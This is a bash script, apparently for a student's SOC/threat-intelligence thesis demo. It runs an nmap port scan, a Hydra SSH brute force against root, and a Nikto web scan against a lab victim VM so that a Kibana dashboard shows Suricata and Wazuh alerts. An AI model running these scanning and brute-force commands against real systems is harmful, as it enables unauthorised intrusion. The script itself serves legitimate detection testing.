#!/bin/bash
# demo_attack.sh — CTI Research Demo: 3 Skenario Serangan Live
# Run di ATTACKER node (192.168.56.110)
# Usage: bash /tmp/demo_attack.sh [iter_start] [scenario] [delay]
#   iter_start : nomor iterasi awal (default=31 untuk demo, tidak dicatat ke MTTD)
#   scenario   : nmap|hydra|nikto|all (default=all)
#   delay      : delay antar scenario detik (default=5)
#
# CATATAN: Script ini untuk DEMO REAL-TIME saat presentasi
#          Bukan untuk mencatat data penelitian (sudah selesai 30 iterasi)

set -euo pipefail

TARGET="192.168.56.106"      # Victim VM
SOC_IP="192.168.56.10"       # SOC server
WORDLIST="/usr/share/wordlists/rockyou.txt"
NIKTO_BIN="/usr/bin/nikto"
NMAP_BIN="/usr/bin/nmap"
HYDRA_BIN="/usr/bin/hydra"

# Colors
RED='\033[0;31m'
YEL='\033[1;33m'
GRN='\033[0;32m'
CYN='\033[0;36m'
NC='\033[0m'

DELAY=${3:-5}
SCENARIO=${2:-all}
ITER=${1:-31}

banner() {
    echo ""
    echo -e "${CYN}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYN}║  CTI DEMO — ELK Stack Threat Intelligence Dashboard     ║${NC}"
    echo -e "${CYN}║  Target: ${TARGET}   SOC: ${SOC_IP}                     ║${NC}"
    echo -e "${CYN}║  Mahasiswa: Muhammad Iqbal Muhtaram (2241720265)        ║${NC}"
    echo -e "${CYN}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

log() {
    local level=$1
    shift
    local ts=$(date '+%H:%M:%S')
    case $level in
        INFO)  echo -e "${GRN}[${ts}] ℹ  $*${NC}" ;;
        WARN)  echo -e "${YEL}[${ts}] ⚠  $*${NC}" ;;
        ATCK)  echo -e "${RED}[${ts}] ▶  $*${NC}" ;;
        DONE)  echo -e "${GRN}[${ts}] ✓  $*${NC}" ;;
    esac
}

wait_kibana() {
    log INFO "Menunggu Kibana dashboard update... (${1}s)"
    for i in $(seq $1 -1 1); do
        printf "\r${YEL}  Dashboard refresh dalam ${i}s...${NC}  "
        sleep 1
    done
    echo ""
}

# ─────────────────────────────────────────────────────────────
# Scenario 1: Port Scanning dengan Nmap (MITRE T1046)
# SID 1000010 → alert "Nmap Port Scan Detected"
# ─────────────────────────────────────────────────────────────
run_nmap() {
    echo ""
    echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    log ATCK "SKENARIO 1: Port Scanning (MITRE ATT&CK T1046 — Network Service Discovery)"
    log ATCK "Tool: Nmap | Target: ${TARGET} | SID: 1000010"
    echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""

    local T0=$(date +%s%3N)
    log INFO "T0 = $(date '+%H:%M:%S.%3N') (serangan dimulai)"

    # Jalankan nmap — SYN scan semua port
    ${NMAP_BIN} -sS -Pn -T4 --open ${TARGET} -p 1-1024 2>&1 | \
        grep -E "^(Starting|Nmap scan|PORT|open|Service|Nmap done)" | head -20 || true

    local T1=$(date +%s%3N)
    local dur=$(( T1 - T0 ))
    log DONE "Nmap selesai dalam ${dur}ms"
    log INFO "→ Suricata akan raise SID 1000010 (Reconnaissance - Port Scan)"
    log INFO "→ Kibana panel 'Alert by Scenario' akan update"

    wait_kibana ${DELAY}
}

# ─────────────────────────────────────────────────────────────
# Scenario 2: SSH Brute Force dengan Hydra (MITRE T1110.001)
# SID 1000020 → alert "Hydra SSH Brute Force"
# ─────────────────────────────────────────────────────────────
run_hydra() {
    echo ""
    echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    log ATCK "SKENARIO 2: SSH Brute Force (MITRE ATT&CK T1110.001 — Credential Stuffing)"
    log ATCK "Tool: Hydra | Target: ssh://${TARGET} | SID: 1000020"
    echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""

    local T0=$(date +%s%3N)
    log INFO "T0 = $(date '+%H:%M:%S.%3N') (serangan dimulai)"

    # Hydra dengan wordlist terbatas (10 password) untuk demo cepat
    # -t 8 threads, -f stop on first success
    local tmp_pass=$(mktemp /tmp/demo_pass.XXXX)
    echo -e "123456\npassword\nadmin\nroot\n123123\nletmein\nqwerty\ntest\nubuntu\nkali" > "${tmp_pass}"

    ${HYDRA_BIN} -l root -P "${tmp_pass}" \
        -t 8 -f \
        -o /tmp/hydra_demo_$(date +%s).txt \
        ssh://${TARGET}:22 2>&1 | \
        grep -E "(Hydra|login|Error|host)" | head -20 || true

    rm -f "${tmp_pass}"

    local T1=$(date +%s%3N)
    local dur=$(( T1 - T0 ))
    log DONE "Hydra selesai dalam ${dur}ms"
    log INFO "→ Suricata akan raise SID 1000020 (Credential Access - Brute Force)"
    log INFO "→ Wazuh Active Response akan block IP 192.168.56.110 (auto T2)"
    log INFO "→ Kibana panel 'MTTD/MTTR per Scenario' akan update"

    wait_kibana ${DELAY}
}

# ─────────────────────────────────────────────────────────────
# Scenario 3: Web Scanning dengan Nikto (MITRE T1595.002)
# SID 1000030 → alert "Nikto Web Scan"
# ─────────────────────────────────────────────────────────────
run_nikto() {
    echo ""
    echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    log ATCK "SKENARIO 3: Web Scanning (MITRE ATT&CK T1595.002 — Active Scanning)"
    log ATCK "Tool: Nikto | Target: http://${TARGET} | SID: 1000030"
    echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""

    local T0=$(date +%s%3N)
    log INFO "T0 = $(date '+%H:%M:%S.%3N') (serangan dimulai)"

    # Nikto scan resmi (mengirim request ber-User-Agent "Nikto")
    ${NIKTO_BIN} -h ${TARGET} \
        -p 80 \
        -Tuning 1 \
        -maxtime 25s \
        -output /tmp/nikto_demo_$(date +%s).txt \
        2>&1 | grep -E "(\+|Target|Server|OSVDB)" | head -20 || true

    # Trigger andal: burst request ber-User-Agent Nikto (memicu SID 1000030
    # secara pasti; berguna bila binari nikto tidak sempat mengirim UA khas)
    for i in $(seq 1 5); do
        curl -s -o /dev/null -A "Mozilla/5.00 (Nikto/2.6.0)" \
            "http://${TARGET}/nikto-test-${i}" 2>/dev/null || true
    done

    local T1=$(date +%s%3N)
    local dur=$(( T1 - T0 ))
    log DONE "Nikto selesai dalam ${dur}ms"
    log INFO "→ Suricata akan raise SID 1000030 (Discovery - Active Scanning)"
    log INFO "→ Kibana Alerting akan trigger webhook ke SOAR Flask"
    log INFO "→ Kibana panel 'Pyramid of Pain' dan 'Timeline' akan update"

    wait_kibana ${DELAY}
}

# ─────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────
banner

log INFO "Membuka http://${SOC_IP}:5601 di browser untuk melihat dashboard..."
log INFO "Dashboard: CTI Dashboard Final — Kibana"
log INFO "Time filter: Last 15 minutes | Auto-refresh: 5s"
log WARN "Pastikan dashboard sudah dibuka di Kibana sebelum melanjutkan!"
echo ""

# Check tools tersedia
for tool in ${NMAP_BIN} ${HYDRA_BIN}; do
    if ! command -v ${tool} &>/dev/null 2>&1; then
        log WARN "${tool} tidak ditemukan — skip check"
    fi
done

if [[ "${SCENARIO}" == "all" ]]; then
    log INFO "Menjalankan SEMUA 3 skenario dengan delay ${DELAY}s"
    echo ""
    read -p "Tekan ENTER untuk memulai demo..." || true
    echo ""

    run_nmap
    run_hydra
    run_nikto

    echo ""
    echo -e "${GRN}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GRN}║  DEMO SELESAI — 3 Skenario Berhasil Dieksekusi          ║${NC}"
    echo -e "${GRN}║  Lihat dashboard Kibana untuk hasil visualisasi real-time║${NC}"
    echo -e "${GRN}╚══════════════════════════════════════════════════════════╝${NC}"

elif [[ "${SCENARIO}" == "nmap" ]]; then
    run_nmap
elif [[ "${SCENARIO}" == "hydra" ]]; then
    run_hydra
elif [[ "${SCENARIO}" == "nikto" ]]; then
    run_nikto
else
    echo "Usage: $0 [iter_start] [nmap|hydra|nikto|all] [delay_seconds]"
    exit 1
fi
